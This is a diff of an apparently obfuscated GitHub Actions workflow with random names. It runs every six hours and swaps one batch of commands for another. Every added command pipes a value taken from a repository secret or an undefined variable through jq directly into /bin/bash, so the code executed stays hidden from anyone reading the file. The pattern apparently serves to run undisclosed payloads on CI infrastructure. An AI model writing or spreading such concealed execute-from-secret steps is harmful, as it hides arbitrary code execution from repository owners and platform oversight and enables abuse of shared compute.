@@ -1,28 +1,22 @@
 name: xindexintazcqq
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
-jobs:  # 13093
+    - cron: '29 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xindexintazcqq
         env:
-          e50: ${{ secrets.e50 }}
+          px93634: ${{ secrets.px93634 }}
         run: |
-          echo $e50 | jq -r .u1527 | /bin/bash
-          echo $dmkq5 | jq -r .d8468 | /bin/bash
-          echo $xzmao4 | jq -r .cbrk00 | /bin/bash
-          echo $mxa145 | jq -r .rc060 | /bin/bash
-          echo $lzhvh57439 | jq -r .a31232 | /bin/bash
-          echo $ivph27 | jq -r .e79026 | /bin/bash
-          echo $dfrpk2 | jq -r .aqro67171 | /bin/bash
-          echo $zjlx6227 | jq -r .wq50153 | /bin/bash
-          echo $cfh8 | jq -r .gvgv206 | /bin/bash
-          echo $zjj8 | jq -r .kv7146 | /bin/bash
-          echo $tj7 | jq -r .pnrz60 | /bin/bash
+          echo $px93634 | jq -r .fb98 | /bin/bash
+          echo $jkjm2 | jq -r .iaaf322 | /bin/bash
+          echo $q08 | jq -r .dsnx03 | /bin/bash
+          echo $ol50394 | jq -r .kwivm240 | /bin/bash
+          echo $nxwil85833 | jq -r .bfjph66030 | /bin/bash
+          echo $z223 | jq -r .zuj6860 | /bin/bash
+          echo $coq66 | jq -r .hjw515 | /bin/bash
 
